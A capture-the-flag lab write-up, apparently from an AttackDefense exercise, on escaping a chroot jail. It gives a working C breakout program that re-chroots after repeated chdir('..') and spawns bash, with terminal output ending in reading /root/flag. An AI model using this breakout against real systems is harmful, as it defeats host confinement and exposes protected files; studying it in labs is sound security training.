Sometimes a user might require root privileges to perform certain operations, however, providing access to the root user of a machine can have severe consequences. Chroot provides the functionality to create a modified environment. In the modified environment, the user can have their own file system but they cannot access files outside the environment directory tree. In this challenge, you have to breakout of the chroot environment and read files of the actual filesystem.

In a chroot environment, if a program is running with root privileges, the program might be ableto perform second chroot and can breakout of the chrooted environment. This is a limitation ofchroot and hence it is recommended that the chrooted program should relinquish root privilegesafter chrooting

List binaries - see gcc in /usr/bin

```
root@attackdefense:~# ls -l /bin
total 1440
-rwxr-xr-x 1 root 0 1113504 Oct 27  2019 bash
-rwxr-xr-x 1 root 0   35064 Oct 27  2019 cat
-rwxr-xr-x 1 root 0  133792 Oct 27  2019 ls
-rwxr-xr-x 1 root 0   63704 Oct 27  2019 rm
-rwxr-xr-x 1 root 0  121432 Oct 27  2019 sh
root@attackdefense:~# ls -l /usr/bin
total 6292
-rwxr-xr-x 1 root 0  917488 Oct 27  2019 as
-rwxr-xr-x 1 root 0   10240 Oct 27  2019 clear
-rwxr-xr-x 1 root 0 1010624 Oct 27  2019 gcc
-rwxr-xr-x 1 root 0   43224 Oct 27  2019 id
-rwxr-xr-x 1 root 0 1779400 Oct 27  2019 ld
-rwxr-xr-x 1 root 0 2671240 Oct 27  2019 vim
```

Create a C program to break out of chroot environment

This program will:

- Create a chroot environment
- Change directory to a path relatively outside of the chroot environemtn (to reach the root rile system outside of chroot environment)
- Enter chroot to access the root file system

```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	mkdir("chroot-dir", 0755);
	chroot("chroot-dir");
	for(int i = 0; i < 1000; i++) {
		chdir("..");
	}
	chroot(".");
	system("/bin/bash");
}
```

Compile the C program

```
root@attackdefense:~# gcc -o break-chroot break-chroot.c
root@attackdefense:~# ls
break-chroot  break-chroot.c
```

Run the binary and see the binaries available in the /bin directory

```
root@attackdefense:~# ./break-chroot
root@attackdefense:/# ls /bin/
'Chroot Jail'   bzmore          domainname   login           pwd          tar            zdiff
 bash           cat             echo         ls              rbash        tempfile       zegrep
 bunzip2        chgrp           egrep        lsblk           readlink     touch          zfgrep
 bzcat          chmod           false        mkdir           rm           true           zforce
 bzcmp          chown           fgrep        mknod           rmdir        umount         zgrep
 bzdiff         cp              findmnt      mktemp          run-parts    uname          zless
 bzegrep        dash            grep         more            sed          uncompress     zmore
 bzexe          date            gunzip       mount           sh           vdir           znew
 bzfgrep        dd              gzexe        mountpoint      sh.distrib   wdctl
 bzgrep         df              gzip         mv              sleep        which
 bzip2          dir             hostname     nisdomainname   stty         ypdomainname
 bzip2recover   dmesg           kill         pidof           su           zcat
 bzless         dnsdomainname   ln           ps              sync         zcmp
```

Search for a flag

```
root@attackdefense:/# find / -name *flag* 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
...
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/root/flag
root@attackdefense:/# cat /root/flag
00bcc88308db5ca58b1f27ddec6cc9c7
```
